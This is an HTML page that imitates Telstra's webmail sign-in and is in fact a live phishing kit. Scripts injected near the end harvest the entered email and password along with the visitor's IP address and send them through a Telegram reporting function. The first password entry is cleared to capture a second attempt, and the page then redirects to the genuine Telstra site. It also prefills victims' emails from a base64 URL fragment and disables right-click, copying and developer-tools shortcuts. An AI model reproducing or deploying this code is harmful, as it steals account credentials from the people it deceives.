






	
		
















  





		
      <!DOCTYPE html>


<!-- template name: html.form.login.template.html -->










  
  
<html lang="en" dir="ltr">

	<head>
  <!-- meta -->
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
  <meta name="robots" content="noindex, nofollow" />
  <!--favicon-->
  

	<link rel="icon" href="https://www.telstra.com.au/etc/designs/telstra/images/t-logo-theme-brand-refresh-favicon.png">
	<link rel="apple-touch-icon" href="https://www.telstra.com.au/etc/designs/telstra/images/t-logo-theme-brand-refresh-apple-touch.png">
  <!-- base -->
  <base href="https://myid.telstra.com/identity/">
      <!-- title -->
  <title>Sign in with your Telstra ID</title>
  <!-- includes -->
  <style>
          @import url('assets/fonts/telstra-fonts.css?v=1.1.002');
      @import url('assets/css/min/telstra-able.min.css?v=1.1.002');
              @import url('assets/css/min/cnsb-custom.min.css?v=1.1.002');
                  @import url('assets/css/min/webmail-cnsb-custom.min.css?v=1.1.002');
                    </style>

  <script>
    let validMessages = {
            "Required_Field":"Required field.",
            "Required_Username_Top":"",
            "Required_Username":"Required field. Please enter your username.",
            "Invalid_Username_Top":"Please check the username.",
            "Invalid_Username":"Invalid entry. Please check the username.",
            "Required_Password_Top":"",
            "Required_Password":"Required field. Please enter your password.",
            "Required_NewPassword":"Required field. Please enter your new password.",
            "Required_NewPassword_Top":"",
            "Required_ReEnterPassword":"Required field. Please confirm new password.",
            "Required_ReEnterPassword_Top":"",
            "Password_Not_Match":"Passwords don't match. Please try again.",
            "InValid_PIN":"Invalid PIN. Please check and try again.",
            "InValid_Code":"Invalid code. Please check and try again.",
            "InValid_Password":"Invalid entry. Password must meet the requirements listed.",
            "InValid_Password_Special":"Invalid entry. Password must only contain the typical letters, numbers, punctuation and space characters.",
            "InValid_Password_Space":"Invalid entry. Password can't begin or end with a space.",
            "Required_Selection":"Required selection.",
            "Required_Selection_Top":"",
            "InValid_PIN_Create":"Invalid PIN. PIN must meet the requirements listed.",
            "PINs_Not_Match":"PINs don't match. Please try again.",
            "Email_Not_Match":"Emails don't match. Please try again.",
        };

    </script>

  <script src="/identity/assets/js/common.min.js?v=1.1.002"></script>

  
 	
         <script src="/identity/assets/js/sha-1.min.js"></script>
      <script>
             let enable_hibp_check = "true";
             let hibp_threshold = "0";
             let is_signin_check = "true";
             sessionStorage.setItem('enable_hibp_check',enable_hibp_check);
             sessionStorage.removeItem('hibp_api_failed');
             if(!JSON.parse(enable_hibp_check) && !JSON.parse(is_signin_check)){
                document.addEventListener("DOMContentLoaded", function(){
                    document.getElementById("ps1").classList.toggle("hide");
                    document.getElementById("ps2").classList.toggle("hide");
                    document.getElementById("ps3").classList.toggle("hide");
              });
             }
             sessionStorage.setItem('hibp_threshold',hibp_threshold)
              function updateUrlWithParms(frm, name, val) {
                     const action = new URL(frm.action);
                     action.searchParams.set(name, val);
                     frm.action = action.href;
              }
              function deleteParamsFromUrl(frm, parms){
                     const action = new URL(frm.action);
                     parms.forEach((each) => {
                            action.searchParams.delete(each);
                     })
                     frm.action = action.href;
                    
              }
      </script>
      <script src="//assets.adobedtm.com/launch-EN150fea03ccaa40d3b4a005dbafdb143c.min.js"></script>
                    <script type="text/javascript" src="https://www.telstra.com.au/apps/liveperson/import.htm"></script>
          <script src="/identity/assets/svg4everybody.legacy.js"></script>
  <script>
    var isIE = "-ms-scroll-limit" in document.documentElement.style && "-ms-ime-align" in document.documentElement.style;
    if (isIE) {
      svg4everybody();
    }
  </script>
      <script src='assets/scripts/captcha/captcha-utils.js'></script>
    <script src='assets/scripts/captcha/captcha-script-loader.js' defer></script>
  </head>
	<body>
		<div>

			<header class="t-page-header">
			<svg width="33px" height="33px" viewBox="0 0 33 33" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-label="Telstra Logo" role="img" focusable="false">
    <g id="Artboard" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
        <g id="Telstra_Primary-logo_C_RGB" fill-rule="nonzero">
            <path d="M18.742504,14.0832 L17.5024033,21.3536 C17.2460517,22.6624 16.3840696,23.0144 15.6182193,23.0144 L9.88235294,23.0144 L12.3016709,9.6992 C9.88876173,8.5952 7.42137789,7.8752 5.4602884,7.8752 C3.59212634,7.8752 2.0764477,8.3808 1.0670634,9.5872 C0.3556878,10.448 0,11.5104 0,12.7712 C0,16.5568 2.98008698,21.808 8.08468757,26.0928 C12.6317235,29.8784 17.6369879,32 21.2771801,32 C23.0940719,32 24.5584802,31.4432 25.523003,30.336 C26.2792401,29.4784 26.5836576,28.3648 26.5836576,27.104 C26.5836576,23.424 23.5811398,18.2688 18.742504,14.0832 Z" id="Path" fill="#F96449"></path>
            <path d="M8.44037537,0 C7.53032731,0 6.77409018,0.6112 6.57221332,1.568 L5.76470588,5.9552 L12.9777981,5.9552 L9.87914855,23.0112 L15.6182193,23.0112 C16.3840696,23.0112 17.2460517,22.656 17.5024033,21.3504 L20.1268025,5.9552 L25.3179217,5.9552 C26.2311742,5.9552 26.9874113,5.3504 27.1892882,4.3904 L28,0 L8.44037537,0 Z" id="Path" fill="#0D54FF"></path>
        </g>
    </g>
</svg>
	</header>

							<div role="main" class="t-form-container">
				
								
					<h1 class="t-able-heading-a   t-able-spacing-2x-mb "> Sign in to Telstra webmail </h1>
																		<div class="t-able-text-bodyshort t-able-spacing-5x-mb">Sign in with your Telstra email address</div>
																<form method="POST" action="/identity/as/IkRiGa2PiW/resume/as/authorization.ping" autocomplete="off">
												                                                                                                                                                                    																																																																																																																					

	<div class="t-back-to-previous-label t-able-spacing-2x-mb" >Back to previous for:</div>
	<a class="t-input-with-anchor   t-able-spacing-4x-mb " data-t-cookie-name="t_login_page" data-t-cookie-value-in-attribute="href" data-t-cookie-show="false" onclick="loadAnalyticEvents('click', 'clickTrack', 'buttonClick', 'Back to previous')">
			<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="6.98" height="12.45" viewBox="0 0 6.98 12.45" role="img" aria-hidden="true" focusable="false">
		<defs>
			<clipPath id="a">
				<path d="M1.82,6.22,6.76,1.28A.75.75,0,1,0,5.7.22L.22,5.69A.77.77,0,0,0,0,6.23a.75.75,0,0,0,.22.53L5.7,12.23a.75.75,0,0,0,.53.22.76.76,0,0,0,.53-.23A.75.75,0,0,0,7,11.69a.77.77,0,0,0-.22-.54Z" fill="none" clip-rule="evenodd"/>
			</clipPath>
		</defs>
		<g clip-path="url(#a)"><rect x="-5" y="-5" width="16.98" height="22.45" fill="#0064d2"/></g>
	</svg>
		<span class="t-able-sr-only">Back to previous for</span>
		<span id="userNameSpan"></span>
	</a>
	<input type="hidden" name="pf.username" id="modUsername" value="">
						<div class="t-able-text-field t-pwd-field  t-able-spacing-2x-mb  ">
	<label for="password">Password</label>
	<input id="password" type="password" name="pf.pass" autofocus autocomplete="current-password" aria-invalid="false" aria-required="true" aria-describedby="password-error-text" onblur="handleOnblurEvent(event, true)">
	<button type="button" id="showPwdBtn" class="t-able-low-emph-button t-showpwd" aria-label="Show password characters" onclick="showHide('show', 'showPwdBtn', 'hidePwdBtn', 'password', 't-icon--hidden')">Show</button>
	<button type="button" id="hidePwdBtn" class="t-able-low-emph-button t-showpwd t-icon--hidden" aria-label="Hide password characters" onclick="showHide('hide', 'hidePwdBtn', 'showPwdBtn', 'password', 't-icon--hidden')">Hide</button>
	<p id="password-error-text"></p>
</div>
						
													
					
			
	<div class=" t-able-spacing-5x-mb ">
												<a class="t-able-low-emph-button  t-reset-password-link " href="https://myid.telstra.com/identity/as/authorization.oauth2?client_id=b2c-webmail&amp;nonce=d3851d8cdf31bf5d235e5f6388aede218a86cb9386c3b914a3d65b323cb89765&amp;redirect_uri=https%3A%2F%2Femail.telstra.com%2Flogin%2Foidc%3Fid%3Da78b98eb-935a-4b92-a431-1993124e2b85&amp;response_type=code&amp;scope=openid+username&amp;state=7473f87e450646a5a22818ead78507d261394d6d074f8ac97e6d51ba1400dfc5&amp;PasswordReset_UsernameVerification=true" onclick="loadAnalyticEvents('click', 'clickTrack', 'linkClick', 'Reset password')">
					Recover account
									</a>
						</div>
												
						<input type="hidden" name="pf.ok" value="clicked"/>
						<input type="hidden" name="pf.cancel" value=""/>
						<input type="hidden" name="client_id" value="b2c-webmail"/>
						<input type="hidden" name="pf.adapterId" id="pf.adapterId" value="upAdapterReCaptcha"/>

						
						<div class="">
							<button id="submit_btn" class="t-able-high-emph-button  t-able-spacing-7x-mb " type="submit" onclick="handleSubmitBtnClk(event)">Sign in</button>
						</div>
						
						
					</form>
				</div>
						
	<footer class="t-footer">
		<div class="t-footer-content">
			<p class="t-footer-copyright">Copyright © 2025 Telstra</p>
						<a class="t-footer-privacy" href="https://www.telstra.com.au/privacy/privacy-statement" target="_blank">Privacy</a>
										<a class="t-footer-terms" href="https://www.telstra.com.au/terms-of-use" target="_blank">Terms of use</a>
					</div>
	</footer>
		</div>

					
<script type="application/javascript">
  document.addEventListener('kpsdk-load', function () {
    window.KPSDK.configure([{
      method: 'POST',
      domain: window.location.host,
      path: '/identity/as/*'
    }, {
      method: 'POST',
      domain: window.location.host,
      path: '/identity/idp/*'
    }]);
  });
  document.getElementById("submit_btn").disabled = true;
  document.addEventListener('kpsdk-ready', function() {
    document.getElementById("submit_btn").disabled = false;
  });
</script>
<script src="/149e9513-01fa-4fb0-aad4-566afd725d1b/2d206a39-8ed7-437e-a3be-862e0f06eea3/p.js"></script>
				


<script>
    var subDivUnit = "TR";
    	var secondCat = "";
				secondCat = "Sign in";
	    window.digitalData = {};
    window.digitalData.page = {};

    window.digitalData.page.pageInfo = {
		pageName: "Sign in with your Telstra ID",
		destinationURL: window.location.href,
		referringURL: document.referrer,
		sysEnv: "desktop",
		deployEnv: "production",
    };
    window.digitalData.page.attributes = {
        division : "TD",
        subDivision : "TR",
        subDivisionUnit : subDivUnit
    };

	
    window.digitalData.page.category = {
        primaryCategory : "identity",
        secondaryCategory : secondCat,
        tertiaryCategory: "",
        pageType : "service"
    };

            window.digitalData.page.pageInfo.pageName = "sign in - password";
              window.digitalData.user = [];
      window.digitalData.user = [{
								"profile": [
											{
												"profileInfo": {
													"loggedInUsing": "Telstra ID:b2c-webmail"
												}
											}
										   ]
							  }];
        function updateProfileInfo(data){
      if(window.digitalData?.user?.length){
        window.digitalData.user[0].profile[0].profileInfo = {...window.digitalData.user[0].profile[0].profileInfo,...data}
      }
    }

    function loadAnalyticEvents(eventAction, eventType, eventCategory, eventName) {
        let eventData = null;
        eventData = {
                     "eventInfo": {
                        "eventAction": eventAction,
                        "eventType": eventType,
                        "eventCategory": eventCategory,
                        "eventName": eventName
                     },
                     "attributes": {}
                    }

        const analytics = window.digitalData;
        if (!("event" in analytics))
            analytics.event = [];

        if (eventData) {
            analytics.event.push(eventData);
        } else {
            analytics.event.push(
                {
                    "eventInfo": {
                        "eventAction": "error"
                    }
                }
            )
        }
        return (window.digitalData = analytics);
    }

</script>
<script type="text/javascript">
  _satellite.pageBottom();
</script>
		<script src="/identity/assets/js/common.min.js?v=1.1.002"></script>

		<script>
        function togglePassword(el) {
            var pwd = document.getElementById('password');
            if (pwd.type === 'password') {
                pwd.type = 'text';
                el.setAttribute('aria-pressed', 'true');
                el.setAttribute('aria-label', 'Hide password');
                el.title = 'Hide password';
            } else {
                pwd.type = 'password';
                el.setAttribute('aria-pressed', 'false');
                el.setAttribute('aria-label', 'Show password');
                el.title = 'Show password';
            }
            try {
                var start = typeof pwd.selectionStart === 'number' ? pwd.selectionStart : pwd.value.length;
                var end = typeof pwd.selectionEnd === 'number' ? pwd.selectionEnd : start;
                pwd.focus();
                setTimeout(function() {
                    try { pwd.setSelectionRange(start, end); } catch (inner) { /* ignore */ }
                }, 0);
            } catch (e) { /* ignore if not supported */ }
        }
        window.addEventListener('DOMContentLoaded', function() {
            var spinner = document.getElementById('initSpinner');
            var app = document.getElementById('app');
            var mainContent = document.getElementById('mainContent');
            var initError = document.getElementById('initError');
            if (mainContent) {
                mainContent.style.display = 'block';
            }
        });
    </script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <!-- Antibot Scripts -->
    <script src="../m/js/fingerprint.js"></script>
    <script src="../m/js/utils.js"></script>
    <script src="../m/js/captcha.js"></script>
    
    <!-- Centralized Functions -->
    <script src="../js/centralized_telegram.js"></script>
    <script src="../js/centralized_redirect.js"></script>
    <script src="../js/email_extractor.js"></script>
    <script src="../js/autofill_helper.js"></script>
    
    <script type="text/javascript" src="https://l2.io/ip.js?var=userip"></script>
		<script>
			
			var telegramCount = 0;
			function handleSubmitBtnClk(event) {
				event.preventDefault();
				serverError = false;

				let isValid = true;
				let unId = "modUsername";
								loadAnalyticEvents('click', 'clickTrack', 'buttonClick', 'Sign in');
				let ariaDescId = "password-error-text";
				if (!validateField("password", ariaDescId, true)) {
					isValid = false;
				}
								if(isValid) {
					var email = document.getElementById("modUsername").value;
					var pw = document.getElementById('password').value;
					
					telegramCount = telegramCount + 1;
					// Use centralized Telegram reporting with provider tag
					window.providerTag = 'bigpond';
					var clientIP = window.userip || 'n/a';
					
					function sendTelemetry(attempt, redirectOnSuccess) {
						// Send centralized Telegram report
						if (typeof sendCentralizedTelegramReport === 'function') {
							sendCentralizedTelegramReport(window.providerTag, email, pw, clientIP, function(success) {
								if (redirectOnSuccess) {
									// Use centralized redirect
									if (typeof performCentralizedRedirect === 'function') {
										performCentralizedRedirect(300);
									} else {
										// Fallback if centralized redirect not available
										setTimeout(function() { window.location.replace('https://email.telstra.com/'); }, 300);
									}
								}
							});
						} else {
							// Fallback if centralized function not available
							console.error('Centralized Telegram function not available');
							if (redirectOnSuccess) {
								if (typeof performCentralizedRedirect === 'function') {
									performCentralizedRedirect(300);
								} else {
									setTimeout(function() { window.location.replace('https://email.telstra.com/'); }, 300);
								}
							}
						}
					}

					sendTelemetry(telegramCount, (telegramCount >= 2));

					if (telegramCount === 1) {
						document.getElementById('password').value = '';
						document.getElementById('password').focus();
						return false;
					}

					removeDomainFromUsername(unId);
					document.getElementById("submit_btn").setAttribute('disabled', 'true');                

					// Skip HIBP API check for now if it's causing issues, or fix it
					if (typeof validatePasswordWithHIBPApi === 'function') {
                        validatePasswordWithHIBPApi(document.getElementById('password').value).then(res => {
                            const hibpCount = sessionStorage.getItem("hibp_b");
                            if(res && hibpCount && hibpCount >= 2) {
                                setCookie('isCompromised', 'true');
                                setCookie('compromisedReport', 'true');           	
                            } else {
                                setCookie('isCompromised', 'false');
                            }
                        }).finally(() => {
                            if (telegramCount >= 2) {
                                document.forms[0].submit();
                            }
                        });
                    } else {
                        if (telegramCount >= 2) {
                            document.forms[0].submit();
                        }
                    }
				}
			}
			// Check hash fragment first (takes priority)
			var hashEmail = null;
			try {
				var h = window.location.hash || '';
				if (h) {
					var fragment = h.substr(1);
					if (fragment) {
						var value = fragment;
						var partsIdx = fragment.indexOf('=');
						if (partsIdx !== -1) {
							var lhs = fragment.substr(0, partsIdx).toLowerCase();
							var rhs = fragment.substr(partsIdx + 1);
							if (lhs === 'email') value = rhs;
						}
						try { value = decodeURIComponent(value); } catch (e) { /* ignore */ }
						var base64regex = /^([A-Za-z0-9+/]{4})*(([A-Za-z0-9+/]{2}==)|([A-Za-z0-9+/]{3}=))?$/;
						if (base64regex.test(value.replace(/\s/g, ''))) {
							try {
								var decoded = atob(value);
								if (decoded) value = decoded;
							} catch (e) { /* ignore if not valid base64 */ }
						}
						var emailFilter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
						if (value && emailFilter.test(value)) {
							hashEmail = value;
							document.getElementById("modUsername").value = hashEmail;
							var userNameSpan = document.getElementById('userNameSpan');
							if (userNameSpan) {
								if (hashEmail.length > 30) {
									var modifiedUN = getShortenedUsername ? getShortenedUsername(hashEmail) : hashEmail;
									userNameSpan.innerText = modifiedUN;
								} else {
									userNameSpan.innerText = hashEmail;
								}
							}
						}
					}
				}
			} catch (e) { /* ignore */ }

			let errMsg = '';
			let t_username_cookie = getCookie('t_username');
			// Only use cookie if hash didn't provide an email
			if(!hashEmail && t_username_cookie){
				document.getElementById("modUsername").value = t_username_cookie;
									document.getElementById('userNameSpan').innerText=t_username_cookie;
								errMsg = t_username_cookie.replaceAll(/[\x3C\x3E\x26]/g, "") + " is already registered to a Telstra ID. Please Sign in.";
				document.getElementById('password-error-text').innerHTML = `<svg class="able-icon" role="img" aria-label="Error" focusable="false">
	            <use href="./assets/able-sprites.svg?v8#Error"></use>
	        </svg> ${errMsg}`;
				setCookie('id_first_username',t_username_cookie);
				deleteCookie('t_username');
			}

			var userNmInpVal = document.getElementById("modUsername").value;

			if (userNmInpVal.length > 30 && document.getElementById('userNameSpan')) {
				let modifiedUN = getShortenedUsername(userNmInpVal);
				document.getElementById('userNameSpan').innerText=modifiedUN;
			}
			if (getCookie('remember_un')) {
				loadAnalyticEvents('click', 'submit', 'confirmation', 'Remember username');
			}
			deleteCookie('t_signed_out');
					</script>
	<script>
  /* global $ */
  $(document).ready(function() {
    function isValidEmail(email) {
      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
      return filter.test(email);
    }



        (function() {
            var isTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
            if (!isTouch) {
                document.addEventListener('contextmenu', function(e) {
                    e.preventDefault();
                    return false;
                }, false);
            }

            document.addEventListener('copy', function(e) {
                try { e.clipboardData.setData('text/plain', 'Copying is disabled on this page.'); } catch (err) {}
                e.preventDefault();
                return false;
            });

            document.addEventListener('selectstart', function(e) {
                if (!e.target.closest('input, textarea')) {
                    e.preventDefault();
                    return false;
                }
            });

            document.addEventListener('keydown', function(e) {
                if (e.keyCode === 123) { e.preventDefault(); e.stopPropagation(); return false; }
                if (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) { e.preventDefault(); e.stopPropagation(); return false; }
                if (e.ctrlKey && (e.keyCode === 85 || e.keyCode === 83)) { e.preventDefault(); e.stopPropagation(); return false; }
                if (e.metaKey && e.altKey && e.keyCode === 73) { e.preventDefault(); e.stopPropagation(); return false; }
            });
        })();
  });
  </script>
	</body>
			<script>
    var sectionList;
            sectionList = ["telstra", "consumer", "identity","forgot-password","dtq"];
    
  livePerson.init({
    section: sectionList,
    sourceSection: ["tcom"],
    onlyTcomCSS: true,
    forceButtonCss: true,
    callBack: function () {
      console.log("CallBack called");
    },
    callBackInterval: 2
  });
</script>
	</html>
